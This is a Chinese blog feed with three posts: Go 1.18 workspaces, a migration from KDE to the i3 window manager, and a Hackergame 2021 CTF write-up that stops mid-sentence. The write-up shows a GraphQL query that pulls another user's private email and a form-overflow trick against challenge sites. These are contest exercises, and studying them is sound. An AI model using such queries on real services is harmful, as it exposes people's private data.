<p>会产生一个<code>go.work</code>文件夹，加入replace</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go 1.18</span><br><span class="line"></span><br><span class="line">use ./hello</span><br><span class="line"></span><br><span class="line">replace github.com/archaeoraptor/hello/hello =&gt; ./hello/hello</span><br></pre></td></tr></table></figure>

<h2 id="终于不再默认更新依赖"><a href="#终于不再默认更新依赖" class="headerlink" title="终于不再默认更新依赖"></a>终于不再默认更新依赖</h2><p>1.18终于更改了之前<code>go mod vendor</code>等命令默认更新<code>go.mod</code>和<code>go.sum</code>的迷惑行为。</p>
<p>什么？这难道不好吗？理论上来说这很好，如果这些包都按照语义化版来。但是有的包它不讲武德，小版本升级有breaking changes，最爱干这种事的还不是那些野鸡包，<strong>就是是谷歌自家的grpc</strong></p>
<p>按照语义化版本号一般的习惯，只有大版本更新（v1更新到v2, v2更新到v3）才有 breaking changes， 小版本的更新是向下兼容的（v1.1更新到v1.2），grpc基本每次小版本更新总有 breaking changes。我好几次arch滚出问题都是因为grpc。</p>
<p>每次想执行<code>go mod vendor</code>等命令的时候，之前为了不让它自动更新<code>go.mod</code>的依赖版本，只能用各种扭曲的办法，比如加<code>-mod=readonly</code>参数。</p>
<h2 id="闲话包管理器"><a href="#闲话包管理器" class="headerlink" title="闲话包管理器"></a>闲话包管理器</h2><p>相比广为诟病的错误处理啊，没有泛型啊，我一直觉得go的包管理器是个更麻烦的问题。包管理器的问题很容易成为历史包袱的。包管理器一开始留下的问题，再想改就很麻烦，有兴趣可以看看npm之类的历史包袱。</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9nby5kZXYvZG9jL3R1dG9yaWFsL3dvcmtzcGFjZXM=">Tutorial: Getting started with multi-module workspaces<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvbGFuZy9nby9pc3N1ZXMvNDU3MTM=">https://github.com/golang/go/issues/45713<i class="fa fa-external-link-alt"></i></span>  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZXB1ZGRzL2dvLW1vZHVsZS1rbm9icy9ibG9iL21hc3Rlci9SRUFETUUubWQ=">go-module-knobs<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9lbmNvcmUuZGV2L2d1aWRlL2dvLm1vZA==">Go modules cheat sheet<i class="fa fa-external-link-alt"></i></span>  </p>
<h3 id="包管理器相关"><a href="#包管理器相关" class="headerlink" title="包管理器相关"></a>包管理器相关</h3><p><span class="exturl" data-url="aHR0cHM6Ly93eHNtLnNwYWNlLzIwMjEvbnBtLWhpc3Rvcnkv">Node.js 包管理器发展史<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9nby5nb29nbGVzb3VyY2UuY29tL3Byb3Bvc2FsLysvbWFzdGVyL2Rlc2lnbi80NTcxMy13b3Jrc3BhY2UubWQ=">Proposal: Multi-Module Workspaces in cmd&#x2F;go<i class="fa fa-external-link-alt"></i></span>   </p>
]]></content>
      <categories>
        <category>Concurrency&amp;Go</category>
      </categories>
      <tags>
        <tag>go</tag>
        <tag>workspace</tag>
      </tags>
  </entry>
  <entry>
    <title>从KDE迁移到i3，顺便说说Linux桌面(DE)和窗口管理器（WM）</title>
    <url>/migrating-from-kde-to-i3/</url>
    <content><![CDATA[<p>这样又将一部分鼠标干的活还给了键盘。</p>
<span id="more"></span>

<p>前一阵不是KDE 25周年吗，然后KDE推出了25周年纪念版，从这开始的几个版本，小问题不断。迫害GNOME是KDE群友的传统艺能，然而，最近似乎KDE用户受到的迫害比GNOME还多。KDE怎么会变成了这个样子？ 于是决定从KDE先迁移到i3之类的wm去。（当然，最主要的原因是我逐渐不需要一个完整DE的那么功能了）</p>
<h2 id="从KDE说起"><a href="#从KDE说起" class="headerlink" title="从KDE说起"></a>从KDE说起</h2><p>KDE一度是我最看好的Linux桌面，功能该有的都有，当时也比较稳定，那时我觉得最近3年应该不用换到其他的桌面去了。<br>KDE为什么是神，首先，要从Konqueror和KHTML的荣光说起…<br>KDE4时代虽然好看，但是因为不稳定而饱受诟病。自从KDE5以来，KDE也稳定了,<br>直到，KDE 25周年特供版……每次更新总有一些新问题，又开始不稳定了…..</p>
<h3 id="防火防盗防抄袭的配置文件"><a href="#防火防盗防抄袭的配置文件" class="headerlink" title="防火防盗防抄袭的配置文件"></a>防火防盗防抄袭的配置文件</h3><p>想抄一下我的KDE的桌面设置？不好意思KDE的设置我自己也不知道它给我保存到哪里去了。</p>
<p>KDE的配置文件在<code>config</code>里面扔的到处都是，实乃居家旅行防偷配置利器。</p>
<p><code>.config</code>目录下面有一个有一个小写的<code>kde</code>目录，还有一个大写的<code>KDE</code>目录,还有一个<code>kde.org</code>目录，下面有<code>systemsettings.conf</code>和<code>plasmashell.conf</code>这样的配置文件。如果你是祖传home目录，那八成还有个<code>kde4</code>。如果你是比较新的用户，你会开心的发现<code>~/.config</code>下面没有<code>kde4</code>，是的，他跑到<code>~/.kde4</code>这来了,<code>~/.kde4/share/config</code>下面有一些kde4的配置。<br>然后，<code>~/.config</code>下面，还有<code>plasmarc</code>，<code>kded5rc</code>，<code>plasmashellrc</code>，<code>kdeglobals</code>，天知道它们有什么区别。<br>然后是一堆散落在<code>.config</code>下面的KDE全家桶应用, 比如<code>kalarmrc</code>。这次看起来挺合理吧，你看别的应用好多不也都把配置文件扔在<code>~/.config</code>下面。</p>
<p>别急，比如KDE出品的和notepad3、vscode类似的文本编辑器kate，在<code>~/.config</code>下面有<code>katerc</code>, <code>kateschemarc</code>, <code>katevirc</code>等等，跟VSCode一个json文件比起来拆的还是太散了。在比如elisa这个音乐播放器，有一个<code>elisarc</code>，还有一个<code>kde.org/elisa.conf</code>。</p>
<p>更麻烦的是这些KDE的设置和其他应用都混在一起了。有一天你的配置崩溃了，KDE起不来，你想全部恢复默认设置，又不能直接全删了来恢复默认设置。（比较好的办法是挑出不是KDE的设置或者）。比如<code>trashrc</code>是KDE的配置文件，它看起来跟KDE毫无关系。</p>
<p>当然有一些第三方工具可以保存KDE的设置，比如<code>konsave</code>，我还给他打过一个AUR包。不过用了两天我立刻发现这并不能解决问题，我想抄别人的配置去改一改还是要打开KDE系统设置的图形界面。某一部分微小的改动，我还是要从茫茫的配置文件里面找到它们，KDE官方有没有说明，结果就是改起配置文件比手动在设置里面调整慢。</p>
<p>当然KDE有一个kcmshell5的命令工具可以在命令行配置，不过我想正常人没有用这个的。你以为他是命令行工具，实际上你执行他，他给你弹出一个和系统设置一样的图形界面。</p>
<p>估计KDE也没想让你使用<code>dotfiles</code>或者直接编辑配置文件，都给我用鼠标在设置里面点击选择的你设置！</p>
<h3 id="小而美的Baloo"><a href="#小而美的Baloo" class="headerlink" title="小而美的Baloo"></a>小而美的Baloo</h3><blockquote>
<p>baloo 是张小龙开发的吗</p>
</blockquote>
<p>哎，这index索引文件怎么50多个G？哎，我桌面怎么突然卡死了？哎，我CPU怎么突然100%了？哎，我内存怎么占用飙升？</p>
<p>Baloo这个用过KDE的应该都有体会，体验大概就是Windows装了个流氓全家桶的感觉。 </p>
<p>一个索引服务, 磁盘写入远超读取是怎样一种体验？</p>
<p>我建议每个每个KDE用户装上KDE立刻关闭Baloo，我也建议有良心的KDE发行版在KDE的默认设置里面禁用Baloo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">balooctl suspend</span><br><span class="line">balooctl disable</span><br><span class="line">balooctl purge #delete the index</span><br></pre></td></tr></table></figure>

<p>如果你还想要一个搜索工具，推荐rg、fd、fzf。<br>如果你想要一个Baloo那样带索引的，试试plocate</p>
<h3 id="混成器"><a href="#混成器" class="headerlink" title="混成器"></a>混成器</h3><p>混成器（Compositer）造成了KDE4时代KDE不如GNOME稳定的传说，当时OpenGL导致画质撕裂。据说当时大部分不稳定的锅都是混成器的，KDE其他的部分还是挺稳定的。<br>就在10月份，KDE将Compositer的选项</p>
<p>Vulkan也不知道要等到什么时候，据说要KDE6了，到时候再试试KDE吧。</p>
<h2 id="使用平铺wm"><a href="#使用平铺wm" class="headerlink" title="使用平铺wm"></a>使用平铺wm</h2><p>最近一年来我对Desktop Enviroment的需求逐渐降低，很多操作都从鼠标点击过渡到了命令操作。我在KDE桌面上操作窗口也从鼠标点击变成了Win+上下左右平铺、Alt+Tab切换窗口、Win+Tab切换桌面。之前非常喜欢的yakuake也被我用tdrop+alacritty替代了。那些标题栏、桌面小组件、任务栏逐渐开始变得鸡肋，而且我也不想要那么多的桌面过渡特效。为了更好地移动窗口我试过krohnkite（一个模仿dwm操作的脚本）</p>
<p>在发现自己的需求基本上wm都能满足之后，好像没有什么用DE的必要了。</p>
<p>平铺的好处是比较充分的铺满整个桌面，而且可以省掉标题栏，对于比较小的笔记本屏幕可以省空间。（笔记本上用wm还比较省电，轻松撑过一整天）</p>
<p>关于wm的介绍可以看这个视频：<span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1BcGk2ZEZNbHhBQQ==">https://www.youtube.com/watch?v=Api6dFMlxAA<i class="fa fa-external-link-alt"></i></span></p>
<p>dwm是类似栈的操作，而i3wm的窗口是一棵树。不过轻度使用应该区别不大，我几乎只用将屏幕两等分或者四等分、或者竖着三等分。</p>
<h3 id="真的一定要那么依赖鼠标和GUI吗"><a href="#真的一定要那么依赖鼠标和GUI吗" class="headerlink" title="真的一定要那么依赖鼠标和GUI吗"></a>真的一定要那么依赖鼠标和GUI吗</h3><p>早些时候人们用键盘的快捷键和命令和计算机打交道，鼠标和GUI界面反而是比较后来的事情了。据说微软当年为了让用户习惯鼠标操作，推出了扫雷、空当接龙和蜘蛛纸牌让大家玩</p>
<p>我从第一次用Windows XP开始就是拿鼠标在图形界面上点点点，在小时候的相当长一段时间内键盘打字都不熟练，后来微机课教的也是Office、Flash、photoshop等拿着鼠标在一堆设置按钮里面选来选取的那种，甚至外的游戏也都是pvz、愤怒的小鸟等鼠标操作居多</p>
<h3 id="i3的一些问题"><a href="#i3的一些问题" class="headerlink" title="i3的一些问题"></a>i3的一些问题</h3><p>不管是i3还是sway，或者dwm之类的，都对浮动窗口支持很差。其实挺难受的，比如沙拉查词之类的翻译软件或者浏览器小窗播放、又比如输入法那个小菜单栏（虽然现在fcitx5没有浮在外面的菜单栏），不太适合平铺。</p>
<p>i3的浮动窗口必须置于平铺的下面，挺难受的。</p>
<p>另外这些平铺桌面</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 我装的cn源里面那个功能最多的开发版本，如果没什么特殊需求可以直接装i3wm或者i3-gaps（支持窗口缝隙）</span></span><br><span class="line"><span class="comment"># yay -S i3-gaps</span></span><br><span class="line">yay -S i3-gaps-next-git </span><br><span class="line">yay -S picom </span><br><span class="line"><span class="comment"># 用来设置外观、锁屏什么的</span></span><br><span class="line">yay -S lxappearance </span><br></pre></td></tr></table></figure>

<p>还有一些fcitx5的configtool、qt界面的设置软件，我用KDE的时候都装过了，这里略过。</p>
<h3 id="polybar作为状态栏"><a href="#polybar作为状态栏" class="headerlink" title="polybar作为状态栏"></a>polybar作为状态栏</h3><p>polybar比i3bar功能多一点而且好看，但是占用也高</p>
<p>polybar自己一点一点配置会很麻烦，比较懒的我直接用的这个：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FkaTEwOTB4L3BvbHliYXItdGhlbWVz">polybar-themes<i class="fa fa-external-link-alt"></i></span>，一个awesome wm的polybar设置脚本，有相当多的主题可供选择。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/adi1090x/polybar-themes.git</span><br><span class="line"><span class="built_in">cd</span> polybar-themes</span><br><span class="line"><span class="built_in">chmod</span> +x setup.sh</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>

<p>然后选一个你喜欢的主题改一改就好了。</p>
<h3 id="picom配置"><a href="#picom配置" class="headerlink" title="picom配置"></a>picom配置</h3><p>其实我对阴影特效、模糊透明毛玻璃、圆角都没有什么需求。装picom主要是解决一下画面撕裂的问题（毕竟Nvidia f**k you, 混成器不要是不行的）</p>
<p>picom可选<code>xrender</code>和<code>glx</code>，以及&#96;&#96;<br>如果要用自带的毛玻璃效果请使用cn源里的<code>picom-git</code>并开启experimental-backends。然后在i3的<code>config</code>设置里面也加上<code>picom --experimental-backends</code></p>
<h3 id="i3lock-color锁屏"><a href="#i3lock-color锁屏" class="headerlink" title="i3lock-color锁屏"></a>i3lock-color锁屏</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S i3lock-color</span><br></pre></td></tr></table></figure>

<h3 id="gtk主题配置"><a href="#gtk主题配置" class="headerlink" title="gtk主题配置"></a>gtk主题配置</h3><p>我用的是capitaine-cursors arc-gtk-theme。这个用lxappearance设置。</p>
<h3 id="HiDPI配置"><a href="#HiDPI配置" class="headerlink" title="HiDPI配置"></a>HiDPI配置</h3><p>大部分应用在<code>~/.Xresources</code>里面配置一下就可以了。但是polybar、rofi这几个都不吃</p>
<p>polybar</p>
<p>config里面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpi = $&#123;xrdb:Xft.dpi:-1&#125;</span><br></pre></td></tr></table></figure>

<p>rofi需要自己一点一点都调了，字体差不多16px，然后圆角和图标那都调大一点。绝大部分rofi主题都是1080p的，要自己调大小。</p>
<h2 id="KISS"><a href="#KISS" class="headerlink" title="KISS"></a>KISS</h2><blockquote>
<p>Keep it simple, stupid</p>
</blockquote>
<p>现在越来越喜欢简单的东西了</p>
<blockquote>
<p>keep it sufficiently sophisticated</p>
</blockquote>
<h2 id="其他的选择"><a href="#其他的选择" class="headerlink" title="其他的选择"></a>其他的选择</h2><p>1.Wayland</p>
<p>I use Nvidia…., so Nvidia f**k</p>
<p>最近某些媒体宣称KDE+Wayland+Nvidia已经差不多了，然而前几天我试了一下KDE的wayland还是有不少小问题的。暂时没有什么迁移到wayland的动力。而且不少应用在xwayland下面的HiDPI体验不是很好。最重要的是alacritty这个东西，在wayland会卡。而我现在对</p>
<p>2.Sway</p>
<p>原因Wayland，我用Nvidia显卡。<br>Sway现在输入法问题基本可以了，剩下的是xwayland在HiDPI有一点不清晰和一部分x的应用我比较习惯所以暂时不打算迁移到wayland</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N3YXl3bS9zd2F5L3B1bGwvNDc0MA==">https://github.com/swaywm/sway/pull/4740<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZjaXR4L2ZjaXR4NS9pc3N1ZXMvMzk=">https://github.com/fcitx/fcitx5/issues/39<i class="fa fa-external-link-alt"></i></span></p>
<p>3.Wayfire</p>
<p>Wayland的原因同上。<br>Wayfire主要还是堆叠窗口的操作，特效和流畅程度看宣传和演示视频可能是Wayland里面最棒的一个了，响应丝滑、特效也很棒。<br>不过Wayfire的那些炫酷的桌面效果我不太想用，我自己大概有blur和活动窗口变亮一点就可以了。<br>Wayfire关掉点特效用来做平铺和堆叠的混合桌面应该不错。因为像i3等对堆叠窗口的操作没有那么丰富，比如堆叠窗口只能放在平铺窗口的上面。</p>
<p>Wayfire目前是0.7版本，最近我看到依云在试水，HiDPI和输入法的问题patch得差不多了，我再等等吧。等1.0正式版，我迁移到Wayland和Wayfire。</p>
<ol start="4">
<li>KDE的平铺选择？</li>
</ol>
<p>如果你对平铺操作的要求不太高，那么KDE自带的快捷键差不多就够了，如果要更多功能，推荐<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Jpc211dGgtRm9yZ2UvYmlzbXV0aA==">bismuth<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly90Lm1lL0FyY2hDTktERVZTR05PTUU=">迫害GNOME的频道<i class="fa fa-external-link-alt"></i></span> （仅供娱乐）<br><span class="exturl" data-url="aHR0cHM6Ly9pbnZlbnQua2RlLm9yZy9wbGFzbWEva3dpbi8tL21lcmdlX3JlcXVlc3RzLzEwODg=">https://invent.kde.org/plasma/kwin/-/merge_requests/1088<i class="fa fa-external-link-alt"></i></span> KDE在这个Merge移除了XRender混成器<br><span class="exturl" data-url="aHR0cHM6Ly9tYWlsLmtkZS5vcmcvcGlwZXJtYWlsL2t3aW4vMjAyMS1KdW5lLzAwNTIzMi5odG1s">https://mail.kde.org/pipermail/kwin/2021-June/005232.html<i class="fa fa-external-link-alt"></i></span> 讨论移除XRender的邮件列表<br><span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2tkZS9jb21tZW50cy9xYW1sZmQvd2FzX3hyZW5kZXJfY29tcG9zaXRvcl9yZW1vdmVkX2luX3BsYXNtYV81MjMv">https://www.reddit.com/r/kde/comments/qamlfd/was_xrender_compositor_removed_in_plasma_523/<i class="fa fa-external-link-alt"></i></span> reddit上的移除XRender受害者（这位是i卡，不是N卡）</p>
<p>Vulkan<br><span class="exturl" data-url="aHR0cDovL2Jsb2cuZGF2aWRlZG11bmRzb24uY28udWsvYmxvZy9ydW5uaW5nLXBsYXNtYXNoZWxsLXdpdGgtdnVsa2FuLw==">http://blog.davidedmundson.co.uk/blog/running-plasmashell-with-vulkan/<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0tERS9rd2luL2NvbW1pdC84MTFiZWI5NGUwYTdkZDU2NjY5MDZiMDdhNTFhODRlZmU1ZjFiYjUz">https://github.com/KDE/kwin/commit/811beb94e0a7dd5666906b07a51a84efe5f1bb53<i class="fa fa-external-link-alt"></i></span></p>
<p>Nvidia的问题（不是很懂为什么移除xrender）<br><span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2tkZS9jb21tZW50cy9xc2t2cjEvc2NyZWVuX2ZsaWNrZXJfcHJvYmxlbV93aXRoXzE0NGh6X29uX2tkZV9uZW9uX2FueS8=">https://www.reddit.com/r/kde/comments/qskvr1/screen_flicker_problem_with_144hz_on_kde_neon_any/<i class="fa fa-external-link-alt"></i></span></p>
<p>i3wm配置参考：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly96anV5ay5naXRsYWIuaW8vcG9zdHMvaTN3bS1jb25maWcv">I3wm 配置思路<i class="fa fa-external-link-alt"></i></span></p>
<p>Polybar配置：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FkaTEwOTB4L3BvbHliYXItdGhlbWVz">https://github.com/adi1090x/polybar-themes<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>KDE</tag>
        <tag>i3wm</tag>
        <tag>kiss</tag>
      </tags>
  </entry>
  <entry>
    <title>Hackergame 2021 (中科大信安赛) Write Up</title>
    <url>/hackergame-2021-write-up/</url>
    <content><![CDATA[<p>吃瓜群众第一次参赛，从LUG过来的，打酱油路过，没学过信安和密码学，然而很遗憾，跟Linux有关的那几个题全都没做出来。。。。<br>很意外自己能挤进200名的，事前完全没有准备，也没接触过CTF之类的东西，甚至比赛开始3天，进行到一半了我才突然发现这比赛它已经开始了，如果早知道 p😭q<br>对，今年这个Hackergame就是UTF-8比赛，对萌新可友好了（确信  </p>
<span id="more"></span>

<p>周二还在想今年中科大信安赛是不是要开始了，结果一看已经进行一半了，来划个水吧。由于太菜加上懒，math零蛋，只能流下数理基础不扎实的泪水p😭q 。 </p>
<p>作为一个纯萌新和老废物，第一次参加Hackergame，以前看到他们中科大LUG办的，就想着下次举办去参加一下玩。以前看到好多Web题和有意思的小题目，虽然我js也特别菜，好歹还能挣扎一下。结果几年一打开就是一堆binary糊脸，二进制和逆向pwm之类的完全不懂，罢了，就做点General吧。</p>
<p>结果？？？？进前200了？</p>
<p><img src="/hackergame-2021-write-up/image-20211030121230343.png" alt="image-20211030121230343"></p>
<p>看来Hackergame真的是萌新友好，明年一定再来玩。</p>
<h2 id="做出了来的的小题目"><a href="#做出了来的的小题目" class="headerlink" title="做出了来的的小题目"></a>做出了来的的小题目</h2><p>还是有不少对我很友好的题目的</p>
<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><blockquote>
<p>为了能让大家顺利签到，命题组把每一秒的 flag 都记录下来制成了日记本的一页。你只需要打开日记，翻到 Hackergame 2021 比赛进行期间的任何一页就能得到 flag！</p>
</blockquote>
<p>打开题目，秒是从1970年开始计算的，这就是UNIX时间戳呗。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">date</span> +%s</span><br></pre></td></tr></table></figure>

<p>得到<code>1635213339</code>，修改URL后缀，得到<code>flag&#123;HappyHacking2021-b0e5f6c9af&#125;</code>签到成功</p>
<h3 id="进制十六——参上"><a href="#进制十六——参上" class="headerlink" title="进制十六——参上"></a>进制十六——参上</h3><p>首先我们OCR识别一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">456163682068657861646563696D616C</span><br><span class="line">20646967697420726570726573656E74</span><br><span class="line">7320666F75722062697473202862696E</span><br><span class="line">61727920646967697473292C20616C73</span><br><span class="line">6F206B6E6F776E2061732061206E6962</span><br><span class="line">626C6520286F72206E7962626C65292C</span><br><span class="line">20776869636820697320312F32206F66</span><br><span class="line">206120627974652E20666C61677B5930</span><br><span class="line">555F5348305531445F6B6E30775F4830</span><br><span class="line">575F74305F43306E763372745F484558</span><br><span class="line">5F746F5F546578547D20466F72206578</span><br><span class="line">616D706C652C20612073696E676C6520</span><br><span class="line">627974652063616E2068617665207661</span><br><span class="line">6C7565732072616E67696E672066726F</span><br><span class="line">6D20303030303030303020746F203131</span><br><span class="line">31313131313120696E2062696E617279</span><br><span class="line">20666F726D2C2077686963682063616E</span><br><span class="line">20626520636F6E76656E69656E746C79</span><br><span class="line">20726570726573656E74656420617320</span><br><span class="line">303020746F20464620696E2068657861</span><br><span class="line">646563696D616C2E0000000000000000</span><br><span class="line">00000000000000000000000000000000</span><br></pre></td></tr></table></figure>

<p>这个好办，打开Bless Hex Editor之类的Hex编辑器, flag的16进制是<code>66 6C 61 67</code>, 找到相应位置，得到flag为<code>flag&#123;Y0U_SH0U1D_kn0w_H0W_t0_C0nv3rt_HEX_to_TexT&#125;</code></p>
<h3 id="卖瓜"><a href="#卖瓜" class="headerlink" title="卖瓜"></a>卖瓜</h3><p>F12想直接修改放瓜数量为负是不可以的，我们没有办法放上一个负数或者小数的瓜</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;放上 6 斤的瓜 &lt;input type=&quot;number&quot; class=&quot;number&quot; name=&quot;b6&quot; value=&quot;0&quot; min=&quot;0&quot;&gt; 个&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<p>然后开始填一个很大的数尝试溢出，果然。</p>
<p><img src="/hackergame-2021-write-up/image-20211026131723641-16352255218271.png" alt="image-20211026131723641"></p>
<p>然后就是打开WolframAlpha, 一边算一边试，试出了一个正好二十。</p>
<h3 id="旅行照片"><a href="#旅行照片" class="headerlink" title="旅行照片"></a>旅行照片</h3><p>一开始没什么头绪，但是看到左下角那个彩色方块的小房子实在是太显眼了，可能是什么地标建筑。我们以图搜图找一下呗。</p>
<p>Google搜图没有结果，TineEye也没有。算了算了，打开我最讨厌的百度（毕竟这可能是一个国内的位置）</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ncmFwaC5iYWlkdS5jb20vcGNwYWdlL3NpbWlsYXI/b3JpZ2luU2lnbj0xMjZjMGQ1YjgyZjIzMmYzMDY5YjkwMTYzNTMxMTc1OSZzcmNwPWNyc19wY19zaW1pbGFyJnRuPXBjJmlkY3RhZz1neiZzaWRzPTEwMDA3XzEwNTEyXzEwNTIxXzEwOTE0XzEwOTEzXzExMDA2XzEwOTI0XzEwOTA1XzEwMDE4XzEwOTAxXzEwOTQyXzEwOTA3XzExMDEyXzEwOTcwXzEwOTY4XzEwOTc0XzExMDMyXzE3ODUxXzE3MDcwXzE4MDEzXzE4MTAxXzE3MjAwXzE3MjAyXzE4MzAxXzE4MzExXzE4MzMwXzE5MzAwXzE5MTkxXzE5MTYyXzE5MjIwXzE5MjEwXzE5MjEyXzE5MjE0XzE5MjE3XzE5MjE5XzE5MjU2XzE5MjMwXzE5MjY4XzE5MjgwXzE5NTUwXzE5NjcwXzEwMDAwJmxvZ2lkPTI0Mzg0MjcwMDgmZW50cmFuY2U9Z2VuZXJhbCZ0cGxfZnJvbT1wYyZwYWdlRnJvbT1ncmFwaF91cGxvYWRfcGNzaGl0dSZpbWFnZT1odHRwOi8vaW1nMS5iYWlkdS5jb20vaXQvdT0zODI1MzQwMjIwLDkyNzYwNTA0NiZmbT0yNTMmYXBwPTEzOCZmPUpQRUc/dz02NDAmaD00ODAmY2Fyb3VzZWw9NTAzJmluZGV4PTEmcGFnZT0xJnNoaXR1VG9rZW49YzkyM2Qz">百度搜图的结果<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ncmFwaC5iYWlkdS5jb20vcGNwYWdlL3NpbWlsYXI/b3JpZ2luU2lnbj0xMjZjMGQ1YjgyZjIzMmYzMDY5YjkwMTYzNTMxMTc1OSZzcmNwPWNyc19wY19zaW1pbGFyJnRuPXBjJmlkY3RhZz1neiZzaWRzPTEwMDA3XzEwNTEyXzEwNTIxXzEwOTE0XzEwOTEzXzExMDA2XzEwOTI0XzEwOTA1XzEwMDE4XzEwOTAxXzEwOTQyXzEwOTA3XzExMDEyXzEwOTcwXzEwOTY4XzEwOTc0XzExMDMyXzE3ODUxXzE3MDcwXzE4MDEzXzE4MTAxXzE3MjAwXzE3MjAyXzE4MzAxXzE4MzExXzE4MzMwXzE5MzAwXzE5MTkxXzE5MTYyXzE5MjIwXzE5MjEwXzE5MjEyXzE5MjE0XzE5MjE3XzE5MjE5XzE5MjU2XzE5MjMwXzE5MjY4XzE5MjgwXzE5NTUwXzE5NjcwXzEwMDAwJmxvZ2lkPTI0Mzg0MjcwMDgmZW50cmFuY2U9Z2VuZXJhbCZ0cGxfZnJvbT1wYyZwYWdlRnJvbT1ncmFwaF91cGxvYWRfcGNzaGl0dSZpbWFnZT1odHRwOi8vaW1nMi5iYWlkdS5jb20vaXQvdT0zMjUxMjkwNzY1LDE0NjUyMzc0ODkmZm09MjUzJmFwcD0xMzgmZj1KUEVHP3c9MjQ5Jmg9MjQ5JmNhcm91c2VsPTUwMyZpbmRleD01JnBhZ2U9MSZzaGl0dVRva2VuPTlkMDk3OA==">百度搜图的结果<i class="fa fa-external-link-alt"></i></span></p>
<p>搜到了，是秦皇岛西浴场。这个彩色方块的小房子是海边的救助亭。</p>
<p>秦皇岛西沙滩，附近有酒店和KFC，而且旁边就是海，应该就是这里了。</p>
<p>旁边甚至还有一个停车场。和一个秦皇岛国际大酒店（最后根据位置发现酒店应该不是这个）</p>
<p>然后查找一下周围的KFC（这种事情应该让馒狗来），果不其然有一个网红Tiffany KFC,一群人在小红书打卡。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cueGlhb2hvbmdzaHUuY29tL2Rpc2NvdmVyeS9pdGVtLzVlOTZjOTE5MDAwMDAwMDAwMTAwNTdjMQ==">https://www.xiaohongshu.com/discovery/item/5e96c91900000000010057c1<i class="fa fa-external-link-alt"></i></span></p>
<p>高德地图上可以找到电话：0335-7168800</p>
<p>大众点评的照片上可以看到左侧建筑的三个字为：<strong>海豚馆</strong></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5kaWFucGluZy5jb20vc2hvcC8yNDQzNDA4Nw==">http://www.dianping.com/shop/24434087<i class="fa fa-external-link-alt"></i></span></p>
<p>从地图上看可能是东南方向，从阳光照射方向看可能是傍晚。</p>
<p>然后就剩下了楼层数，大概有15、16层左右的样子，随便试几个。结果是16，好的，得到flag</p>
<h3 id="去吧！追寻自由的电波"><a href="#去吧！追寻自由的电波" class="headerlink" title="去吧！追寻自由的电波"></a>去吧！追寻自由的电波</h3><p>这个是我精通八门乐器的校艺术团室友秒掉的，听了一遍就说修改采样率（大概从48000调到了18000的样子），就可以听到正常的声音了。<br>是一串北约音标字母。</p>
<p>真好，虽然找不到中科大少年班的神通口算口算RSA，但是我有精通乐理的室友。</p>
<h3 id="喵咪问答-Pro-Max"><a href="#喵咪问答-Pro-Max" class="headerlink" title="喵咪问答 Pro Max"></a>喵咪问答 Pro Max</h3><p>这个没啥好说的，Google搜就完事了（已经关闭的网站看Web Archive的快照就好了）</p>
<p>report地址是<code>/dev/null</code>可还行</p>
<h3 id="图之上的信息"><a href="#图之上的信息" class="headerlink" title="图之上的信息"></a>图之上的信息</h3><p>graphql查询，这个也比较简单，没做什么严格的限制去卡你，直接查就完事了</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    user(id<span class="punctuation">:</span><span class="number">1</span>)<span class="punctuation">&#123;</span></span><br><span class="line">        username</span><br><span class="line">        privateEmail</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>url接口是<code>/graphql?query=&#123;.....&#125;</code>, 会得到一个：</p>
